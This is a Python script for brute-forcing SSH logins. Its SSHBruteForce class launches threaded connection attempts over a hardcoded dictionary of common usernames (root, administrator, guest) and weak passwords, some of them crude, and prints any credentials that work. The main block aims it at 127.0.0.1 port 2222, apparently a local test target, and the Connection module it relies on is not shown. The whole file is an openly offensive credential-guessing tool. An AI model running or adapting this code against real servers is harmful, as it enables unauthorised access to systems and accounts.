import random
import sys
from optparse import OptionParser
import time
import Util
from Connection import Connection


class SSHBruteForce():
    def __init__(self):
        self.connections = []
        self.currentThreadCount = 0
        self.verbose = True

    def createConnection(self, username, password, targetIp, targetPort, timeoutTime):
        connection = Connection(username, password, targetIp, targetPort, timeoutTime)
        connection.start()

        self.connections.append(connection)
        self.currentThreadCount += 1
        if self.verbose:
            print("[*] Adding Target: {0}, Testing with username: {1}, testing with password: {2}".format(targetIp,
                                                                                                          username,
                                                                                                          password))

    def currentThreadResults(self):
        for connection in self.connections:
            connection.join()
            if connection.status == 'Succeeded':
                print("[#] TargetIp: {} ".format(connection.targetIp))
                print("[#] Username: {} ".format(connection.username))
                print("[#] Password: {} ".format(connection.password))
            else:
                pass

        self.clearOldThreads()

    def clearOldThreads(self):
        self.connections = []
        self.threadCount = 0

    def completed(self):
        print("[*] Completed Brute Force.")
        sys.exit(0)


if __name__ == '__main__':
    sshBruteForce = SSHBruteForce()
    user_pass_list = {'root': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'ssh_brute': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'guest': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'administrator': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou']}
    for user in user_pass_list:
        for passwd in user_pass_list[user]:
            sshBruteForce.createConnection(user,passwd,'127.0.0.1',2222,1000)
            time.sleep(0.5)
    sshBruteForce.currentThreadResults()
    print("[*] Brute Force Completed")
